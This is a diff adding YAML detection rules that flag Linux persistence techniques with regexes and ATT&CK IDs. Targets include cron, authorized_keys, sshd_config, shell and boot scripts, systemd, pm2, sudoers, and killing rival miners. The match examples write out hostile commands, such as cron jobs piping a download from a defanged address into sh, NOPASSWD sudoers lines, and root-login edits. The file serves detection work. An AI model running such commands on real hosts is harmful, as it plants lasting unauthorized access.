@@ -1,0 +1,319 @@
+# Persistence writes, before transfer: a line that writes a download into a cron job, authorized_keys, a shell or
+# boot script or a systemd unit is persistence first. Each target has two rules: the first matches when the text
+# also names a downloader (curl or wget, anywhere, even inside a heredoc body) and adds T1105; the second matches
+# the plain write. A write is a > or >> redirection, tee, a downloader's output option, cp, mv, install or ln with the
+# target as the last argument of its line, or an editor (vi, vim, nvim, nano, pico, emacs, ed, or sed -i) opening
+# the target. Reading these files is never a match, and neither is an editor in a read-only mode (vim -R, -M or -m,
+# nano or pico -v) or visudo -c, which only checks the file.
+#
+# kill-competitor (Exclusive Control, a persistence technique) is here too, so it comes before process-list, which
+# would otherwise take a line such as ps aux | grep xmrig | xargs kill.
+#
+# The -download rules read every line up to a heredoc opener ({anystage}), since the downloader gates them; the
+# plain rules read the first line only. Placeholders such as {cmd}, {stage}, {anystage}, {word} and {end} are
+# described in rules.py.
+
+- id: cron-download
+  match:
+    regex: '^(?=[\s\S]*?(?<![\w.-])(?:curl|wget)(?![\w-]))(?:[\s\S]*?(?:{anystage}(?:crontab(?:[^\S\n]+-u[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-u{word}+|[^\S\n]+-[insx]+{end}){0,8}(?:[^\S\n]+-e{end}|[^\S\n]+-{end}|[^\S\n]+[^\s|;&()<>{}`-]|[^\S\n]*(?:$|[\n|;&)<`}]))|tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?(?:/etc/cron|/var/spool/cron))|>>?[^\S\n]*["\x27]?(?:/etc/cron|/var/spool/cron))|{cmd}(?:curl|wget)(?:\.exe)?{end}.*?\s(?:-[A-Za-z]*[oOP]\s*|--(?:output|output-document|directory-prefix)(?:=|\s+))["\x27]?(?:/etc/cron|/var/spool/cron))'
+  meaning: Installs a cron job that downloads code, so the download runs again on a schedule.
+  techniques: [T1053.003, T1105]
+  artifacts: [Scheduled Job, URL]
+  iocs: [url, ipv4, domain, path]
+  confidence: high
+  multiline: true  # a heredoc written to crontab or a cron file is the job it installs
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "(crontab -l 2>/dev/null; echo '* * * * * curl -fsSL hxxp://203.0.113[.]5/x.sh | sh') | crontab -"
+      - "echo '*/5 * * * * root wget -q -O- hxxp://203.0.113[.]5/x | sh' > /etc/cron.d/x"
+      - "wget -q -O /etc/cron.d/x hxxp://203.0.113[.]5/c"
+      - "cd /tmp\necho '* * * * * curl -s hxxp://203.0.113[.]5/c | sh' >> /var/spool/cron/root"
+      - "crontab - <<EOF\n* * * * * curl -s hxxp://203.0.113[.]5/c | sh\nEOF"  # the heredoc feeds crontab
+      - "grep -c x <<< \"$s\"\n(crontab -l; echo '* * * * * curl -s hxxp://203.0.113[.]5/c | sh') | crontab -"
+    no_match:
+      - "(crontab -l; echo '@reboot /tmp/x') | crontab -"
+      - "curl -s hxxp://203.0.113[.]5/x -o /tmp/x"
+      - "crontab -l | grep curl"
+      # A script being written: the crontab line is the heredoc's body.
+      - "cat > x.sh <<EOF\n(crontab -l; echo '* * * * * curl -s hxxp://203.0.113[.]5/c | sh') | crontab -\nEOF"
+
+- id: cron
+  match:
+    regex: '{stage}(?:crontab(?:[^\S\n]+-u[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-u{word}+|[^\S\n]+-[insx]+{end}){0,8}(?:[^\S\n]+-e{end}|[^\S\n]+-{end}|[^\S\n]+[^\s|;&()<>{}`-]|[^\S\n]*(?:$|[\n|;&)<`}]))|tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?(?:/etc/cron|/var/spool/cron))|>>?[^\S\n]*["\x27]?(?:/etc/cron|/var/spool/cron)|{cmd}(?:(?:cp|mv|install|ln|rsync){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?)(?:/etc/cron|/var/spool/cron)'
+  meaning: Creates or edits a cron job so a command runs on a schedule.
+  techniques: [T1053.003]
+  artifacts: [Scheduled Job]
+  iocs: [path, url, ipv4, domain]
+  confidence: high
+  multiline: true  # a heredoc written to crontab or a cron file is the job it installs
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "crontab -e"
+      - "(crontab -l; echo '* * * * * /tmp/x') | crontab -"
+      - "echo '*/5 * * * * root /tmp/x' > /etc/cron.d/x"
+      - "crontab /tmp/c"
+      - "crontab -u www-data -e"
+      - "echo '@reboot /tmp/x' | tee -a /etc/crontab"
+      - "cp /tmp/c /etc/cron.d/x"
+      - "vi /etc/crontab"
+      - "sed -i '$a @reboot /tmp/x' /var/spool/cron/crontabs/root"
+    no_match:
+      - "crontab -l"
+      - "crontab -u root -l"
+      - "crontab -l > /tmp/c"
+      - "crontab -r"
+      - "cat /etc/crontab"
+      - "cp /etc/crontab /tmp/c"
+      - "sed -n '1p' /etc/crontab"
+      - "vim -R /etc/crontab"
+      - "view /etc/crontab"
+      - "cat > notes.txt <<'EOF'\nstep 2; crontab -e\nEOF"  # a later line, in a note
+      - "cat > notes.txt <<'EOF'\nlater: echo x | crontab -\nEOF"
+
+- id: ssh-authorized-keys-download
+  match:
+    regex: '^(?=[\s\S]*?(?<![\w.-])(?:curl|wget)(?![\w-]))(?:[\s\S]*?(?:>>?[^\S\n]*["\x27]?|{anystage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?)[^\s|;&()<>"\x27`]*\.ssh/authorized_keys2?(?![\w.-])|{cmd}(?:curl|wget)(?:\.exe)?{end}.*?\s(?:-[A-Za-z]*[oOP]\s*|--(?:output|output-document|directory-prefix)(?:=|\s+))["\x27]?[^\s|;&()<>"\x27`]*\.ssh/authorized_keys2?(?![\w.-]))'
+  meaning: Downloads an SSH key into authorized_keys, so the attacker can log in again later.
+  techniques: [T1098.004, T1105]
+  artifacts: [SSH Authorized Keys, URL]
+  iocs: [path, url, ipv4, domain]
+  confidence: high
+  multiline: true  # a heredoc written to authorized_keys is the keys it adds
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "curl -s hxxp://203.0.113[.]5/k >> ~/.ssh/authorized_keys"
+      - "wget -q hxxp://203.0.113[.]5/k -O /root/.ssh/authorized_keys"
+    no_match:
+      - "echo 'ssh-ed25519 AAAAC3Nza example' >> ~/.ssh/authorized_keys"
+      - "curl -s hxxp://203.0.113[.]5/k -o /tmp/k"
+
+- id: ssh-authorized-keys
+  match:
+    regex: '(?:>>?[^\S\n]*["\x27]?|{stage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?|{cmd}(?:(?:cp|mv|install|ln){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?))[^\s|;&()<>"\x27`]*\.ssh/authorized_keys2?(?![\w.-])'
+  meaning: Adds an SSH key so the attacker can log in again later.
+  techniques: [T1098.004]
+  artifacts: [SSH Authorized Keys]
+  iocs: [path, url, ipv4, domain]
+  confidence: high
+  multiline: true  # a heredoc written to authorized_keys is the keys it adds
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "echo 'ssh-ed25519 AAAAC3Nza example' >> ~/.ssh/authorized_keys"
+      - "tee -a /root/.ssh/authorized_keys"
+      - "cat id_rsa.pub >> ~/.ssh/authorized_keys"
+      - "cp /tmp/k /root/.ssh/authorized_keys"
+      - "emacs ~/.ssh/authorized_keys"
+    no_match:
+      - "cat ~/.ssh/authorized_keys"
+      - "cp ~/.ssh/authorized_keys /tmp/k"
+      - "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
+
+# The SSH daemon's configuration: PermitRootLogin, PasswordAuthentication, PubkeyAuthentication and
+# AuthorizedKeysFile decide who may log in, so a write to it is T1098.004 too. Written the same ways as the files
+# above; reading it is never a match.
+- id: sshd-config
+  match:
+    regex: '(?:>>?[^\S\n]*["\x27]?|{stage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?|{cmd}(?:(?:cp|mv|install|ln){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?))/etc/ssh/sshd_config(?:\.d/|(?![\w.-]))'
+  meaning: Changes the SSH server's settings, such as allowing root or password logins, to keep a way back in.
+  techniques: [T1098.004]
+  artifacts: [SSH Authorized Keys]
+  iocs: [path]
+  confidence: high
+  multiline: true  # a heredoc written to sshd_config is the settings it sets
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config"
+      - "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
+      - "echo 'PermitRootLogin yes' | sudo tee /etc/ssh/sshd_config.d/x.conf"
+      - "nano /etc/ssh/sshd_config"
+    no_match:
+      - "sed -n '1p' /etc/ssh/sshd_config"
+      - "grep -i permit /etc/ssh/sshd_config"
+      - "cp /etc/ssh/sshd_config /tmp/s"
+      - "pwd\necho k | tee -a ~/.ssh/authorized_keys"  # tee reads the first line only; >> reads every line
+
+- id: shell-rc-download
+  match:
+    regex: '^(?=[\s\S]*?(?<![\w.-])(?:curl|wget)(?![\w-]))(?:[\s\S]*?(?:>>?[^\S\n]*["\x27]?|{anystage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?)(?:(?:[^\s|;&()<>"\x27`]*/)?\.(?:bashrc|bash_profile|bash_login|bash_logout|profile|zshrc|zshenv|zprofile|zlogin|zlogout)(?![\w.-])|/etc/(?:profile(?![\w.-])|profile\.d/|bash\.bashrc(?![\w.-])|bashrc(?![\w.-])|zsh/z(?:shrc|shenv|profile|login)(?![\w.-])|zshrc(?![\w.-])|zprofile(?![\w.-]))))'
+  meaning: Adds a download to a shell startup file, so it runs at every login or new shell.
+  techniques: [T1546.004, T1105]
+  artifacts: [User Init Script, URL]
+  iocs: [path, url, ipv4, domain]
+  confidence: high
+  multiline: true  # a heredoc written to a shell startup file is the lines it adds
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "echo 'curl -s hxxp://203.0.113[.]5/x | sh' >> ~/.profile"
+      - "echo 'wget -q -O- hxxp://203.0.113[.]5/x | sh &' >> /etc/profile.d/x.sh"
+    no_match:
+      - "echo 'alias ls=/tmp/.x/ls' >> ~/.bashrc"
+      - "curl -s hxxp://203.0.113[.]5/x -o ~/.bashrc.bak"
+
+- id: shell-rc
+  match:
+    regex: '(?:>>?[^\S\n]*["\x27]?|{stage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?|{cmd}(?:(?:cp|mv|install|ln){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?))(?:(?:[^\s|;&()<>"\x27`]*/)?\.(?:bashrc|bash_profile|bash_login|bash_logout|profile|zshrc|zshenv|zprofile|zlogin|zlogout)(?![\w.-])|/etc/(?:profile(?![\w.-])|profile\.d/|bash\.bashrc(?![\w.-])|bashrc(?![\w.-])|zsh/z(?:shrc|shenv|profile|login)(?![\w.-])|zshrc(?![\w.-])|zprofile(?![\w.-])))'
+  meaning: Adds a command to a shell startup file, so it runs at every login or new shell.
+  techniques: [T1546.004]
+  artifacts: [User Init Script]
+  iocs: [path, url, ipv4, domain]
+  confidence: high
+  multiline: true  # a heredoc written to a shell startup file is the lines it adds
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "echo 'alias ls=/tmp/.x/ls' >> ~/.bashrc"
+      - "echo /tmp/.x/run > /etc/profile.d/x.sh"
+      - "echo 'export PATH=/tmp/.x:$PATH' | tee -a /root/.zshrc"
+      - "cp /tmp/p /etc/profile.d/p.sh"
+      - "nano ~/.bashrc"
+    no_match:
+      - "cat ~/.bashrc"
+      - "source ~/.bashrc"
+      - "cp ~/.bashrc /tmp/b"
+      - "nano -v ~/.bashrc"
+
+- id: rc-script-download
+  match:
+    regex: '^(?=[\s\S]*?(?<![\w.-])(?:curl|wget)(?![\w-]))(?:[\s\S]*?(?:>>?[^\S\n]*["\x27]?|{anystage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?)/etc/(?:rc\.local|rc\.d/rc\.local|rc\.common|init\.d/|rc[0-6S]\.d/))'
+  meaning: Adds a download to a boot script such as /etc/rc.local, so it runs at every start.
+  techniques: [T1037.004, T1105]
+  artifacts: [System Init Script, URL]
+  iocs: [path, url, ipv4, domain]
+  confidence: high
+  multiline: true  # a heredoc written to a boot script is the script it installs
+  platforms: [linux]
+  examples:
+    match:
+      - "echo 'wget -q -O- hxxp://203.0.113[.]5/x | sh' >> /etc/rc.local"
+      - "echo 'curl -s hxxp://203.0.113[.]5/x | sh' | tee -a /etc/rc.d/rc.local"
+    no_match:
+      - "echo '/tmp/.x/run &' >> /etc/rc.local"
+      - "curl -s hxxp://203.0.113[.]5/x -o /tmp/rc.local"
+
+- id: rc-script
+  match:
+    regex: '(?:>>?[^\S\n]*["\x27]?|{stage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?|{cmd}(?:(?:cp|mv|install|ln){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?))/etc/(?:rc\.local|rc\.d/rc\.local|rc\.common|init\.d/|rc[0-6S]\.d/)'
+  meaning: Adds a command to a boot script such as /etc/rc.local, so it runs at every start.
+  techniques: [T1037.004]
+  artifacts: [System Init Script]
+  iocs: [path, url, ipv4, domain]
+  confidence: high
+  multiline: true  # a heredoc written to a boot script is the script it installs
+  platforms: [linux]
+  examples:
+    match:
+      - "echo '/tmp/.x/run &' >> /etc/rc.local"
+      - "cp /tmp/x /etc/init.d/x"
+      - "vim /etc/rc.local"
+    no_match:
+      - "cat /etc/rc.local"
+      - "ls /etc/init.d/"
+
+- id: systemd-service-download
+  match:
+    regex: '^(?=[\s\S]*?(?<![\w.-])(?:curl|wget)(?![\w-]))(?:[\s\S]*?(?:>>?[^\S\n]*["\x27]?|{anystage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?)[^\s|;&()<>"\x27`]*/systemd/(?:system|user)/|{cmd}(?:curl|wget)(?:\.exe)?{end}.*?\s(?:-[A-Za-z]*[oOP]\s*|--(?:output|output-document|directory-prefix)(?:=|\s+))["\x27]?[^\s|;&()<>"\x27`]*/systemd/(?:system|user)/)'
+  meaning: Downloads a systemd unit file, so a service the attacker controls can start at boot.
+  techniques: [T1543.002, T1105]
+  artifacts: [System Init Configuration, URL]
+  iocs: [path, url, ipv4, domain]
+  confidence: high
+  multiline: true  # a heredoc written to a unit file is the unit it installs
+  platforms: [linux]
+  examples:
+    match:
+      - "curl -o /etc/systemd/system/x.service hxxp://203.0.113[.]5/x.service"
+      - "wget -q hxxp://203.0.113[.]5/u -O /lib/systemd/system/u.service"
+    no_match:
+      - "cp /tmp/x.service /etc/systemd/system/x.service"
+      - "curl -s hxxp://203.0.113[.]5/x -o /tmp/x.service"
+
+- id: systemd-service
+  match:
+    regex: '(?:>>?[^\S\n]*["\x27]?|{stage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?)[^\s|;&()<>"\x27`]*/systemd/(?:system|user)/|{cmd}(?:(?:(?:cp|mv|install|ln){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?)[^\s|;&()<>"\x27`]*/systemd/(?:system|user)/)|{stage}systemctl(?:[^\S\n]+-{word}*){0,8}[^\S\n]+(?:enable|link){end}'
+  meaning: Installs or enables a systemd service, so a program starts at boot or keeps running.
+  techniques: [T1543.002]
+  artifacts: [System Init Configuration]
+  iocs: [path, url, ipv4, domain]
+  confidence: medium
+  multiline: true  # a heredoc written to a unit file is the unit it installs
+  platforms: [linux]
+  examples:
+    match:
+      - "cp /tmp/x.service /etc/systemd/system/x.service"
+      - "systemctl enable --now x.service"
+      - "systemctl --user enable u.service"
+      - "cat > /etc/systemd/system/x.service <<EOF"
+      - "nano /etc/systemd/system/x.service"
+      - "systemctl daemon-reload && systemctl enable x"
+      - "sudo systemctl link /opt/x/x.service"
+    no_match:
+      - "systemctl status x.service"
+      - "cat /etc/systemd/system/x.service"
+      - "systemctl is-enabled x.service"
+      - "systemctl daemon-reload"
+
+# pm2 startup writes a boot service for the pm2 daemon (a systemd unit on a systemd host) and pm2 save records the
+# processes it brings back, so together they make a program start again at every boot.
+- id: pm2-startup
+  match:
+    regex: '{stage}pm2(?:[^\S\n]+-{word}*){0,8}[^\S\n]+(?:startup|save){end}'
+  meaning: Registers the pm2 process manager as a boot service, or saves the processes it restarts at boot.
+  techniques: [T1543.002]
+  artifacts: [System Init Configuration]
+  confidence: medium
+  platforms: [linux]
+  examples:
+    match: ["pm2 startup", "pm2 startup systemd -u app --hp /home/app", "pm2 save", "pm2 start x.js && pm2 save"]
+    no_match: ["pm2 list", "pm2 logs", "pm2 unstartup"]
+
+- id: sudoers-write
+  match:
+    regex: '(?:>>?[^\S\n]*["\x27]?|{stage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?|{cmd}(?:(?:cp|mv|install|ln){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?))/etc/sudoers(?:\.d/|(?![\w.-]))|{cmd}visudo{end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*[chVx])[A-Za-z]*|--(?:check|help|version|export)){end})'
+  meaning: Writes a sudoers rule, typically letting an account run anything as root without a password.
+  techniques: [T1548.003]
+  artifacts: [Access Control Configuration]
+  iocs: [path]
+  confidence: high
+  multiline: true  # a heredoc written to sudoers is the rule it adds
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
+      - "echo 'x ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/x"
+      - "cp /tmp/s /etc/sudoers.d/s"
+      - "sed -i 's/^#includedir/includedir/' /etc/sudoers"
+      - "sudo visudo"
+    no_match:
+      - "cat /etc/sudoers"
+      - "grep -r NOPASSWD /etc/sudoers.d/"
+      - "sudo visudo -c"
+      - "vim -R /etc/sudoers"
+
+# Killing a competing miner is a cryptojacking step: ATT&CK's Exclusive Control (T1668) covers removing other
+# malware from a compromised host, and its detection analytics name killing competing processes. T1489 (Service
+# Stop) describes making services unavailable to legitimate users, which this is not.
+- id: kill-competitor
+  match:
+    regex: '(?i){cmd}(?:(?:pkill|killall)(?=\s)|kill(?=\s)[^$`\n]*(?:\$\(|`)\s*(?:pgrep|pidof|ps)(?=\s)|(?:ps|pgrep|pidof)(?=\s)(?=.*\|\s*(?:sudo\s+)?xargs\b[^|\n]*\bkill\b)).*?\b(?:xmrig|xmr-stak|minerd|cpuminer|nbminer|t-rex|lolminer|kdevtmpfsi|kinsing|stratum)'
+  meaning: Kills a competing cryptominer or known mining malware, to keep the host's compute for itself.
+  techniques: [T1668]
+  artifacts: [Process]
+  confidence: medium
+  platforms: [linux]
+  examples:
+    match:
+      - "pkill -9 -f kdevtmpfsi"
+      - "kill -9 $(pgrep xmrig)"
+      - "killall -9 xmrig"
+      - "ps aux | grep -v grep | grep kinsing | awk '{print $2}' | xargs kill -9"
+      - "pgrep -f xmrig | xargs -r kill -9"
+    no_match:
+      - "pkill -f sshd"
+      - "kill -9 1234"
+      - "ps aux | grep xmrig"
